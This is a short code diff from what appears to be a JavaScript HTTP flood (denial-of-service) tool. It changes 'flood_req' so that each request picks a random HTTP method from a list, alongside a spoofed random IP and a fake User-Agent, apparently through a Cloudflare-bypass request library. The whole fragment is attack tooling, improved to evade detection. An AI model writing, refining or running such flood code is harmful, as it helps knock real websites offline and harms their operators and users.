@@ -17,8 +17,9 @@ return Math.round(Math.random()*256)
 function flood_req(){
 var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
 var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
+var randommode = Array_method[Math.floor(Math.random()*Array_method.length)]
 cf.request({
-method:Array_method,
+method:randommode,
 resolveWithFullResponse: true,
 headers:{
 'User-Agent': fakeUa()
